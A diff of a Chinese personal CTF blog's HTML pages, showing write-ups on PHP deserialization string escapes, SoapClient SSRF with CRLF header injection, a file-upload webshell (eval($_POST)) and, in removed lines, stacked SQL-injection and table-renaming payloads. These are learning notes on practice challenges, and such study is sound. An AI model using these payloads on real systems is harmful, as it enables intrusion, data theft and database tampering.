class="number">1</span>;  <span class="comment">//传参</span></span><br><span class="line"><span class="variable">$t</span> =<span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"><span class="comment">//t=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;反序列化字符串：&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(serialize(<span class="variable">$msg</span>));  <span class="comment">//</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;过滤后:&quot;</span>;</span><br><span class="line"><span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$umsg</span>);   </span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?f&#x3D;1&amp;m&#x3D;1&amp;t&#x3D;fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;  &#x2F;&#x2F;传参然后访问message.php得flag</span><br></pre></td></tr></table></figure>
+<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>php中的scapClient类可以创建soap数据报文，与wsdl接口进行交互</p>
+<h3 id="SoapClient-call方法进行SSRF"><a href="#SoapClient-call方法进行SSRF" class="headerlink" title="SoapClient __call方法进行SSRF"></a>SoapClient __call方法进行SSRF</h3><ul>
+<li><pre><code>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。(需手动开启)
+必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。
+通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容
+仅限于http/https协议
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- &#x2F;&#x2F;soap是什么：</span><br><span class="line">  soap是webServer的三要素之一(SOAP、WSDL、UDDI)</span><br><span class="line">  WSDL用来描述如何访问具体的接口</span><br><span class="line">  UUDI用来管理、分发、查询webServer</span><br><span class="line">  SOAP是连接web服务和客户端的接口</span><br><span class="line">  简单地说，SOAP 是一种简单的基于 XML 的协议，它使应用程序通过 HTTP 来交换信息</span><br><span class="line">  原文链接：https:&#x2F;&#x2F;blog.csdn.net&#x2F;LYJ20010728&#x2F;article&#x2F;details&#x2F;117112864</span><br><span class="line"></span><br><span class="line">- &#96;&#96;&#96;</span><br><span class="line">  用法：</span><br><span class="line">  </span><br><span class="line">  public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )</span><br><span class="line">  </span><br><span class="line">  第一个参数是用来指明是否是wsdl模式</span><br><span class="line">  如果为null，那就是非wsdl模式，反序列化的时候会对第二个参数指明的url进行soap请求</span><br><span class="line">  </span><br><span class="line">  如果第一个参数为null，则第二个参数必须设置location和uri</span><br><span class="line">    其中location是将请求发送到的SOAP服务器的URL</span><br><span class="line">    uri是SOAP服务的目标名称空间</span><br><span class="line">  </span><br><span class="line">  第二个参数允许设置user_agent选项来设置请求的user-agent头</span><br><span class="line">  正常情况下的SoapClient类，调用一个不存在的函数，会去调用__call方法，发出请求</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  SoapClient发出的请求包的user_agent是完全可控的，结合CRLF注入可以构造一个完全可控的POST请求，因为POST请求最关键的Content-Length和Content-Type都在user_agent之下</span><br><span class="line">  如果是GET请求，就简单得多，只需要构造好location就可以了</span><br><span class="line">  需要注意的是，SoapClient只会发出请求，而不会收到响应</span><br></pre></td></tr></table></figure>
+#### demo：259
+</code></pre>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$xff</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line">array_pop(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = array_pop(<span class="variable">$xff</span>);   <span class="comment">//对请求头中的X-Forwarded-For进行两次pop</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];yike</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;    <span class="comment">//POST传入token，其值为ctfshow</span></span><br><span class="line">		file_put_contents(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);  <span class="comment">//满足上面条件即可访问含有flag的flag.txt文件</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;getFlag();</span><br></pre></td></tr></table></figure>
+<p>解题：</p>
+<p>利用ssrf访问flag.php接着构造post数据 toke=ctfshow和请求头X-Forwarded-For 就能把flag写到flag.txt中了。<br>那么ssrf漏洞在哪呢，这就得用到我们前面提到的SoapClient类了。这个类中有个__call魔术方法（当调用不存在的方法时触发），会调用SoapClient类的构造方法。<br>另外用到CRLF（注意读序列化内容要读源码）<br>payload:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ua</span> = <span class="string">&quot;ctfshow\r\nX-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type:application/x-www-from-urlencoded\r\nContent-length:13\r\n\r\ntoken=ctfshow&quot;</span>;  <span class="comment">//监听发现ua内容可控，构造XFF两次pop  POST内容</span></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/&#x27;</span>,<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span>=&gt;<span class="variable">$ua</span>));   <span class="comment">//通过ssrf访问flag.php</span></span><br><span class="line"><span class="comment">//$client-&gt;getflag();</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$client</span>)); <span class="comment">//满足条件，将条件内容序列化，再由题目代码反序列化，调用未知函数，调用__call方法发出请求</span></span><br></pre></td></tr></table></figure>
+<p>get传vip=xxx(序列化内容)，最后访问/flag.txt拿到flag了。</p>
+<p>感悟：似懂非懂</p>
+<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="其他小知识"><a href="#其他小知识" class="headerlink" title="其他小知识"></a>其他小知识</h2><p>cookie传参：是以;作为分隔符的，否则会导致解析错误（解决方法：url编码）</p>
+<h3 id="CRLF-Injection"><a href="#CRLF-Injection" class="headerlink" title="CRLF Injection"></a>CRLF Injection</h3><p>CRLF是”回车 + 换行”（\r\n）的简称。在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码，所以CRLF Injection又叫HTTP Response Splitting，简称HRS。</p>
+<p>附链接：<a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html</a></p>
+<h2 id="题外"><a href="#题外" class="headerlink" title="题外"></a>题外</h2><p>先到这里，其他知识以后再补充</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/LYJ20010728/article/details/117112864">https://blog.csdn.net/LYJ20010728/article/details/117112864</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/solitudi/article/details/113588692">https://blog.csdn.net/solitudi/article/details/113588692</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/19/Namp/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -645,7 +857,7 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-15 19:47:15" itemprop="dateModified" datetime="2021-03-15T19:47:15+08:00">2021-03-15</time>
+                <time title="Modified: 2021-09-13 22:06:54" itemprop="dateModified" datetime="2021-09-13T22:06:54+08:00">2021-09-13</time>
               </span>
 
           
@@ -664,7 +876,7 @@ b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d
 <hr>
 <h2 id="ACTF2020-新生赛-Upload"><a href="#ACTF2020-新生赛-Upload" class="headerlink" title="[ACTF2020 新生赛]Upload"></a>[ACTF2020 新生赛]Upload</h2><p>很普通的文件上传题目，和[极客大挑战 2019]Upload 一样</p>
 <hr>
-<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>扫后台（其实没扫出来），index.php.bak</p>
+<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>扫后台（多扫几次），index.php.bak</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include_once &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#39;key&#39;])) &#123;</span><br><span class="line">    $key &#x3D; $_GET[&#39;key&#39;];    &#x2F;&#x2F;传参key</span><br><span class="line">    if(!is_numeric($key)) &#123;      &#x2F;&#x2F;key是数字</span><br><span class="line">        exit(&quot;Just num!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $key &#x3D; intval($key);</span><br><span class="line">    $str &#x3D; &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;;</span><br><span class="line">    if($key &#x3D;&#x3D; $str) &#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">    echo &quot;Try to find out source file!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>php弱类型比较==</p>
 <p>intval（）函数用于获取变量的整数值。</p>
@@ -819,7 +1031,7 @@ auto_prepend_file=test.jpg</code></pre>
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-12 20:54:42" itemprop="dateModified" datetime="2021-03-12T20:54:42+08:00">2021-03-12</time>
+                <time title="Modified: 2021-09-13 21:22:14" itemprop="dateModified" datetime="2021-09-13T21:22:14+08:00">2021-09-13</time>
               </span>
 
           
@@ -884,6 +1096,8 @@ resource=flag.php</code></pre>
 <li>?%20num=var_dump(scandir(chr(47))): 查看文件目录（“/”被过滤了，可以使用chr(47)来进行表示，进行目录读取）  </li>
 <li>?%20num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))  读取flag  </li>
 </ul>
+<p>空格绕过waf</p>
+<p>http走私之CC绕过</p>
 <hr>
 <h2 id="极客大挑战-2019-Http"><a href="#极客大挑战-2019-Http" class="headerlink" title="[极客大挑战 2019]Http"></a>[极客大挑战 2019]Http</h2><p>It doesn’t come from ‘<a target="_blank" rel="noopener" href="https://www.sycsecret.com&/#39;">https://www.Sycsecret.com&#39;</a><br>加  Referer:<a target="_blank" rel="noopener" href="https://www.sycsecret.com/">https://www.Sycsecret.com</a><br>Please use “Syclover” browser<br>改  User-Agent: Syclover” browser<br>No!!! you can only read this locally!!!<br>加  X-Forwarded-For:127.0.0.1</p>
 <hr>
@@ -901,235 +1115,6 @@ resource=flag.php</code></pre>
 <pre><code>GIF89a
 &lt;script language=&#39;php&#39;&gt;eval($_POST[flag]);&lt;/script&gt;  </code></pre>
 <p>上传成功，抓包，修改后缀，尝试蚁剑登录<br>但是文件后缀改为php,字符php被过滤，修改为phtml即可上传成功<br>地址为url+upload+文件名<br>根目录找flag</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/03/03/buu-piapiapia/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/03/buu-piapiapia/" class="post-title-link" itemprop="url">buu-piapiapia</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-              
-
-              <time title="Created: 2021-03-03 17:17:25 / Modified: 19:46:49" itemprop="dateCreated datePublished" datetime="2021-03-03T17:17:25+08:00">2021-03-03</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="0CTF-2016-piapiapia1"><a href="#0CTF-2016-piapiapia1" class="headerlink" title="[0CTF 2016]piapiapia1"></a>[0CTF 2016]piapiapia1</h2><p>不是sql注入，扫后台，发现网站源码泄漏（<a target="_blank" rel="noopener" href="http://www.zip)/">www.zip）</a>  </p>
-<hr>
-<p> config.php，里面有个flag变量（判断flag在config.php中，想办法读取）：</p>
-<pre><code>$config[&#39;hostname&#39;] = &#39;127.0.0.1&#39;;
-$config[&#39;username&#39;] = &#39;root&#39;;
-$config[&#39;password&#39;] = &#39;&#39;;
-$config[&#39;database&#39;] = &#39;&#39;;
-$flag = &#39;&#39;;</code></pre>
-<hr>
-<p> profile.php文件:</p>
-<pre><code>&lt;?php
-require_once(&#39;class.php&#39;);//profile.php包含了class.php
-if($_SESSION[&#39;username&#39;] == null) &#123;
-    die(&#39;Login First&#39;);
-&#125;
-$username = $_SESSION[&#39;username&#39;];
-$profile=$user-&gt;show_profile($username);//变量由show_profile()方法传递，由于profile.php包含了class.php，所以在class.php中跟踪该方法
-if($profile  == null) &#123;
-    header(&#39;Location: update.php&#39;);
-&#125;
-else &#123;
-    $profile = unserialize($profile);//对$profile变量进行了反序列化
-    $phone = $profile[&#39;phone&#39;];
-    $email = $profile[&#39;email&#39;];
-    $nickname = $profile[&#39;nickname&#39;];
-    $photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));//file_get_contents()(将一个文件读取到一个字符串中)
-?&gt;</code></pre>
-<ul>
-<li>想办法利用file_get_contents()读取config.php文件</li>
-</ul>
-<hr>
-<p>class.php:</p>
-<p>跟踪show_profile()</p>
-<pre><code>public function show_profile($username)
-&#123;
-    $username = parent::filter($username);
-    $where = &quot;username = &#39;$username&#39;&quot;;
-    $object = parent::select($this-&gt;table, $where);
-    return $object-&gt;profile;
-&#125;//对username进行处理，调用了父类filter和select方法</code></pre>
-<p>涉及到的方法如下（class.php）：</p>
-<pre><code>public function select($table, $where, $ret = &#39;*&#39;) &#123;
-    $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;;
-    $result = mysql_query($sql, $this-&gt;link);
-    return mysql_fetch_object($result);
-&#125;
-
-public function filter($string) &#123;
-    $escape = array(&#39;\&#39;&#39;, &#39;\\\\&#39;);
-    $escape = &#39;/&#39; . implode(&#39;|&#39;, $escape) . &#39;/&#39;;
-    $string = preg_replace($escape, &#39;_&#39;, $string);
-    $safe = array(&#39;select&#39;, &#39;insert&#39;, &#39;update&#39;, &#39;delete&#39;, &#39;where&#39;);
-    $safe = &#39;/&#39; . implode(&#39;|&#39;, $safe) . &#39;/i&#39;;
-    return preg_replace($safe, &#39;hacker&#39;, $string);
-&#125;//替换字符串中的单引号和反斜杠为下划线 ，并且替换多个字符串为hacker。implode函数是表示把数组拼接起来，拼接符是 “|”：</code></pre>
-<hr>
-<p>update.php中反序列化操作:</p>
-<pre><code>$user-&gt;update_profile($username, serialize($profile));</code></pre>
-<p>调用了class.php中user子类的update_profile方法，回到class.php</p>
-<pre><code>public function update_profile($username, $new_profile) &#123;
-    $username = parent::filter($username);
-    $new_profile = parent::filter($new_profile);
-    $where = &quot;username = &#39;$username&#39;&quot;;
-    return parent::update($this-&gt;table, &#39;profile&#39;, $new_profile, $where);
-&#125;</code></pre>
-<p>又利用了父类中的filter方法，同时还有update方法</p>
-<pre><code>public function update($table, $key, $value, $where) &#123;
-    $sql = &quot;UPDATE $table SET $key = &#39;$value&#39; WHERE $where&quot;;
-    return mysql_query($sql);
-&#125;</code></pre>
-<hr>
-<p>综上：</p>
-<p>unserialize-&gt;show_profile方法-&gt;select方法</p>
-<p>serialize-&gt;update_profile方法-&gt;update方法</p>
-<p>分析：首先数据经过序列化传入到数据库，然后取出的时候反序列化，需要传入参数，并且构造恶意参数，而update.php这个页面我们可以看到是一个数据传入的页面，看看是否存在漏洞</p>
-<pre><code>if(!preg_match(&#39;/^\d&#123;11&#125;$/&#39;, $_POST[&#39;phone&#39;]))
-die(&#39;Invalid phone&#39;);
-
-if(!preg_match(&#39;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#39;, $_POST[&#39;email&#39;]))
-die(&#39;Invalid email&#39;);
-
-if(preg_match(&#39;/[^a-zA-Z0-9_]/&#39;, $_POST[&#39;nickname&#39;]) || strlen($_POST[&#39;nickname&#39;]) &gt; 10)
-die(&#39;Invalid nickname&#39;);</code></pre>
-<p>前两个参数好像都没办法绕过，第三个参数好像可以绕过。<br>这里我们可以发现前面的正则时匹配所有字母和数字，也就是nickname是字母和数字的话，就是真，strlen()函数可以使用数组绕过，nickname就完全被我们控制了。</p>
-<p>update.php:</p>
-<pre><code>$profile[&#39;phone&#39;] = $_POST[&#39;phone&#39;];
-$profile[&#39;email&#39;] = $_POST[&#39;email&#39;];
-$profile[&#39;nickname&#39;] = $_POST[&#39;nickname&#39;];
-$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;]);
-$user-&gt;update_profile($username, serialize($profile));</code></pre>
-<p>unserialize(str) 会忽略能够正常序列化的字符串后面的字符串。像这样的一个字符串，我们可以可以不用反序列话，就能知道它反序列化后是什么，因为它是有规律的<br>a:4:{s:5:“phone”;s:11:“11111111111”;s:5:“email”;s:11:“<a href="mailto:&#x31;&#x61;&#x32;&#115;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;">&#x31;&#x61;&#x32;&#115;&#x40;&#x71;&#113;&#46;&#x63;&#x6f;&#109;</a>”;s:8:“nickname”;s:3:“123”;s:5:“photo”;s:39:“upload/f3b94e88bd1bd325af6f62828c8785dd”;}<br>a:4指的是由一个数组序列化而来，并且有4个值。如果是对象的话，把a改成了O。然后就是一个键值名，一个变量值：<br>s:5:”phone”;第一个键值名，是string类型的，长度为五，s:11:”11111111111”;第一个变量值，string类型，长度为11.这就是它的规律。如果我们在这个序列化字符串的后面，再加上一些字符，后面的字符是不会被反序列化的<br>————————————————<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44077544/article/details/102703489">https://blog.csdn.net/weixin_44077544/article/details/102703489</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="https://jingdaqiang.github.io/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="六公子买单">
-      <meta itemprop="description" content="一头努力的菜鸟">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Daq1ang">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/" class="post-title-link" itemprop="url">buu-随便注</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2021-01-31 18:20:27" itemprop="dateCreated datePublished" datetime="2021-01-31T18:20:27+08:00">2021-01-31</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2021-03-28 15:09:20" itemprop="dateModified" datetime="2021-03-28T15:09:20+08:00">2021-03-28</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="buu-web第二题，随便注"><a href="#buu-web第二题，随便注" class="headerlink" title="buu-web第二题，随便注"></a>buu-web第二题，随便注</h1><p>题目很嚣张啊，打开一看，1，提交如下，给了一段代码<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz1.png" alt="buu-sbz1.png"><br>接下来，根据常规操作，判断出字符型注入，两个字段，当我们开心地进行联合注入时，发现<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz2.png" alt="buu-sbz1.png"><br>select被注释掉了，也就是不能联合查询找flag了，所以要绕过select，用别的方法。<br>看了好多大佬的wp，说因可以输入多个语句，因此可以用堆叠查询<br>先查数据库（没啥用）<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz3.png" alt="buu-sbz1.png"><br>查表如下，有两个<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz4.png" alt="buu-sbz1.png"><br>再查表中的列如下(字符串为表名操作时要加反引号)，发现了flag<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz5.png" alt="buu-sbz1.png">  </p>
-<h2 id="方法1-预编译"><a href="#方法1-预编译" class="headerlink" title="方法1.预编译"></a>方法1.预编译</h2><p>flag在第一个表中，查flag，select被过滤，大佬说用预编译的方式绕过这个过滤，构造     </p>
-<pre><code>-1&#39;;set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
-`1919810931114514`;&#39;);prepare aaa from @sql;EXECUTE aaa; --+     </code></pre>
-<p>出现如下图,发现还过滤了set和prepare<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz6.png" alt="buu-sbz1.png"><br>利用文件上传漏洞大小写绕过，重新构造payload如下：     </p>
-<pre><code>-1&#39;;Set @sql = CONCAT(&#39;sele&#39;,&#39;ct * from
-`1919810931114514`;&#39;);Prepare aaa from @sql;EXECUTE aaa; --+</code></pre>
-<p>欢天喜地，得到flag<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz7.png" alt="buu-sbz1.png">    </p>
-<hr>
-<h2 id="方法2-handler查询"><a href="#方法2-handler查询" class="headerlink" title="方法2.handler查询"></a>方法2.handler查询</h2><p>mysql可以使用select查询表中的数据，也可使用handler语句，这条语句是一行一行的浏览一个表中的数据。<br>handler可以用于MyISAM和InnoDB表。<br>使用方法：<br>handler table_name open打开一张表<br>handel table_name read first读取第一行内容，<br>handel table_name read next依次获取其它行<br>最后一行执行之后再执行handel table_name read next会返回一个空的结果。<br>构造payload：</p>
-<pre><code>-1&#39;;handler `1919810931114514` open;handler `1919810931114514` read first;#    </code></pre>
-<p><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz8.png" alt="buu-sbz1.png"><br>简单快捷，恐怖如斯！     </p>
-<hr>
-<h2 id="方法3-修改表名和列名"><a href="#方法3-修改表名和列名" class="headerlink" title="方法3.修改表名和列名"></a>方法3.修改表名和列名</h2><p>由上面知道flag在表“1919810931114514”中，查表words<br><img src="/2021/01/31/buu-%E9%9A%8F%E4%BE%BF%E6%B3%A8/buu-sbz9.jpg" alt="buu-sbz1.png"><br>根据两个表的情况结合实际查询出结果的情况判断出words是默认查询的表，因为查询出的结果是一个数字加一个字符串，words表结构是id和data，传入的inject参数也就是赋值给了id，我们可以利用数据库修改表名和列名的方法，将我们要查询的表名改成第二个，就可以查询出想要的内容了<br>操作如下：<br>alter table words rename to aaa;先把原来的words表名字改成其他<br>alter table 1919810931114514 rename to words;将表1919810931114514的名字改为words<br>alter table words change flag id varchar(100);将改完名字后的表中的flag改为id，字符串尽量长点<br>构造payload如下：</p>
-<pre><code>1&#39;; alter table words rename to aaaa;alter table `1919810931114514` rename to words;alter table words change flag id varchar(100);--+</code></pre>
-<p>然后我们用1’ or 1=1 –+直接就能得到  </p>
 
       
     </div>
@@ -1214,7 +1199,7 @@ $user-&gt;update_profile($username, serialize($profile));</code></pre>
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">29</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
